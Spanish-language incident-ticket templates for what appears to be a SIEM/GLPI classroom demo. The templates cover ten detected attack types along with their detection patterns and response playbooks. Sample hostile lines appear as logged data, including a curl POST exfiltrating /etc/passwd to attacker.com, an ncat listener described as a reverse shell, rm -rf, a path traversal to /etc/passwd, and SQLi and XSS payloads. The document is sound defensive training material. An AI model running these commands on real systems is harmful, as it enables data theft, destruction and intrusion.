# Plantillas de Tickets GLPI - 10 Escenarios

Instrucciones: Copiar y pegar en GLPI → Asistencia → Crear ticket

## 1. SSH BRUTE FORCE (MEDIUM)

```
Título: MEDIUM: SSH Brute Force desde 192.168.1.50 - 04/02/2026

Descripción:
ATAQUE SSH BRUTE FORCE
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
IP Origen: 192.168.1.50
Intentos detectados: 10 fallos
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "ssh_failed_login"
- Tags: ssh_failed_login, security_event
- Patrón: Failed password for invalid user

ACCIONES (según PLAYBOOK):
1. Bloquear IP en firewall (iptables)
2. Revisar logs completos /var/log/auth.log
3. Cambiar puerto SSH si persiste

TAXONOMÍA: VERIS - Hacking/Brute force
SLA: 4h respuesta / 3 días resolución
```

Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium

## 2. SQL INJECTION (HIGH)

```
Título: HIGH: SQL Injection en aplicación web - 04/02/2026

Descripción:
ATAQUE SQL INJECTION
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client (Apache)
IP Origen: 192.168.1.105
Query maliciosa: SELECT * FROM users WHERE 1=1--
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "sql_injection"
- Tags: sql_injection, security_event
- Patrón: SELECT, UNION, OR 1=1, DROP TABLE

ACCIONES (según PLAYBOOK):
1. Bloquear IP origen inmediatamente
2. WAF: Activar modo blocking para SQLi
3. Revisar logs Apache últimas 24h
4. Verificar integridad base de datos

TAXONOMÍA: VERIS - Hacking/SQLi
SLA: 1h respuesta / 24h resolución
ESCALAR: DBA + CISO
```

Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High

## 3. XSS ATTACK (HIGH)

```
Título: HIGH: XSS Attack detectado en formulario web - 04/02/2026

Descripción:
ATAQUE CROSS-SITE SCRIPTING (XSS)
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client (Apache)
Payload: <script>alert('XSS')</script>
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "xss_attack"
- Tags: xss_attack, security_event
- Patrón: <script>, onerror=, javascript:

ACCIONES (según PLAYBOOK):
1. Sanitizar inputs en aplicación web
2. Implementar Content Security Policy (CSP)
3. WAF: Bloquear payloads XSS conocidos
4. Revisar logs web completos

TAXONOMÍA: VERIS - Hacking/XSS
SLA: 1h respuesta / 24h resolución
ESCALAR: Desarrollo + Seguridad
```

Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High

## 4. PATH TRAVERSAL (HIGH)

```
Título: HIGH: Path Traversal detectado en aplicación web - 04/02/2026

Descripción:
ATAQUE PATH TRAVERSAL
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client (Apache)
IP Origen: 192.168.1.120
Recurso solicitado: /files?path=../../../etc/passwd
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "path_traversal"
- Tags: path_traversal, security_event
- Patrón: ../, /etc/passwd, /etc/shadow

ACCIONES (según PLAYBOOK):
1. Bloquear IP origen inmediatamente
2. Revisar logs web últimas 24h
3. Verificar permisos de archivos sensibles
4. Revisar si hubo acceso exitoso (HTTP 200)

TAXONOMÍA: VERIS - Hacking/Path traversal
SLA: 1h respuesta / 24h resolución
ESCALAR: Desarrollo + Seguridad
```

Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High

## 5. COMANDO DESTRUCTIVO (CRITICAL)

```
Título: CRÍTICO: Comando destructivo rm -rf ejecutado - 04/02/2026

Descripción:
INCIDENTE CRÍTICO - COMANDO DESTRUCTIVO
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Usuario: root
Comando ejecutado: rm -rf /important/data
IP Origen: [INTERNA]
Severidad: CRITICAL

DETECCIÓN:
- Detectado por regla Logstash "destructive_command"
- Tags: destructive_command, security_event
- Patrón: rm -rf, mkfs, dd if=/dev/zero

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Aislar host de red INMEDIATAMENTE
2. Bloquear usuario root
3. Iniciar análisis forense
4. Revisar backups disponibles
5. Identificar vector de compromiso

TAXONOMÍA: VERIS - Misuse/Privilege Abuse
SLA: 15 min respuesta / 4h resolución
ESCALAR: CISO + Dirección TI (URGENTE)
```

Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major

## 6. ESCALADA DE PRIVILEGIOS (CRITICAL)

```
Título: CRÍTICO: Escalada de privilegios detectada - 04/02/2026

Descripción:
INCIDENTE CRÍTICO - PRIVILEGE ESCALATION
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Usuario origen: hacker → root
Comando: changed to root
Severidad: CRITICAL

DETECCIÓN:
- Detectado por regla Logstash "privilege_escalation"
- Tags: privilege_escalation, security_event
- Patrón: sudo su, sudo -i, sudo /bin/bash

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Bloquear usuario user01 inmediatamente
2. Auditar comandos sudo ejecutados
3. Revisar /var/log/auth.log completo
4. Cambiar contraseñas root de emergencia
5. Verificar configuración sudoers

TAXONOMÍA: VERIS - Misuse/Privilege Escalation
SLA: 15 min respuesta / 4h resolución
ESCALAR: CISO + Administradores (URGENTE)
```

Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major

## 7. PORT SCANNING (MEDIUM)

```
Título: MEDIUM: Port Scanning desde 192.168.1.75 - 04/02/2026

Descripción:
PORT SCANNING DETECTADO
Timestamp: 04/02/2026 [HORA]
Host objetivo: syslog-client
IP Origen: 192.168.1.75
Puertos escaneados: 1-65535
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "port_scan"
- Tags: port_scan, security_event
- Patrón: Nmap scan, Discovered open port

ACCIONES (según PLAYBOOK):
1. Bloquear IP origen en firewall
2. Revisar logs de conexiones últimas 6h
3. Verificar puertos expuestos innecesarios
4. Implementar rate limiting

TAXONOMÍA: VERIS - Hacking/Network probing
SLA: 4h respuesta / 3 días resolución
```

Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium

## 8. PROCESOS SOSPECHOSOS (HIGH)

```
Título: HIGH: Proceso sospechoso detectado - 04/02/2026

Descripción:
PROCESO MALICIOSO DETECTADO
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Proceso: ncat -lvp 4444
Detalle: Reverse shell connection established
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "suspicious_process"
- Tags: suspicious_process, security_event
- Patrón: ncat, cryptominer, .hidden

ACCIONES (según PLAYBOOK):
1. Kill proceso inmediatamente (kill -9)
2. Aislar host de red
3. Buscar persistencia (cron, systemd)
4. Análisis memoria y disco (forensics)
5. Eliminar archivos maliciosos
6. Escaneo antivirus completo

TAXONOMÍA: VERIS - Malware/Cryptominer
SLA: 1h respuesta / 24h resolución
ESCALAR: Seguridad + Forense
```

Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High

## 9. EXFILTRACIÓN DE DATOS (HIGH)

```
Título: HIGH: Exfiltración de datos detectada - 04/02/2026

Descripción:
DATA EXFILTRATION DETECTADA
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Comando: curl -X POST /etc/passwd http://attacker.com/exfil
Destino: attacker.com (IP externa)
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "data_exfiltration"
- Tags: data_exfiltration, security_event
- Patrón: scp, sftp, curl con destinos externos

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Bloquear conexión destino en firewall
2. Identificar datos exfiltrados
3. Revisar logs de transferencias últimas 48h
4. Aislar host afectado
5. Notificar DPO (protección de datos)
6. Análisis forense completo

TAXONOMÍA: VERIS - Hacking/Data theft
SLA: 1h respuesta / 24h resolución
ESCALAR: CISO + DPO + Legal (URGENTE)
REGULATORIO: Posible GDPR breach
```

Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=5-Very High

## 10. INSTALACIÓN NO AUTORIZADA (MEDIUM)

```
Título: MEDIUM: Instalación no autorizada detectada - 04/02/2026

Descripción:
INSTALACIÓN NO AUTORIZADA DETECTADA
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Paquete/Comando: apt install netcat-traditional
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "unauthorized_installation"
- Tags: unauthorized_installation, security_event
- Patrón: apt install, yum install, dpkg, Installed:

ACCIONES (según PLAYBOOK):
1. Verificar usuario y origen de la instalación
2. Desinstalar software no autorizado
3. Revisar logs de paquetes (apt/yum/dpkg)
4. Verificar persistencia o backdoors

TAXONOMÍA: VERIS - Misuse/Unauthorized installation
SLA: 4h respuesta / 3 días resolución
```

Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium

## RESUMEN POR SEVERIDAD

CRITICAL (2 tickets):
- 5. Comando Destructivo
- 6. Escalada de Privilegios

HIGH (5 tickets):
- 2. SQL Injection
- 3. XSS Attack
- 4. Path Traversal
- 8. Procesos Sospechosos
- 9. Exfiltración de Datos

MEDIUM (3 tickets):
- 1. SSH Brute Force
- 7. Port Scanning
- 10. Instalación No Autorizada

## PARA LA DEMO

Recomendación: Crea solo 1-2 tickets durante la presentación (máximo 5 minutos). Los más impactantes:

1. Comando Destructivo (CRITICAL) - Ticket #5 (MEJOR OPCIÓN)
2. SQL Injection (HIGH) - Ticket #2

Los otros 8: Menciona que ya están documentados pero por tiempo solo mostrarás el crítico.

Frase para la demo:
"El sistema ha detectado 10 tipos de ataques diferentes. Por tiempo, voy a documentar el más crítico: comando destructivo. Los otros 9 ya están documentados siguiendo el mismo proceso."

## TIPS

- Copiar rápido: Ctrl + C todo el bloque
- Pegar en GLPI: Campo Descripción soporta múltiples líneas
- Timestamp: Reemplaza [HORA] con hora actual
- IP/PID: Puedes dejar genéricos o copiar de Kibana
- Durante demo: Solo crear 1 ticket (el CRITICAL), mencionar que proceso se repite para los otros 9
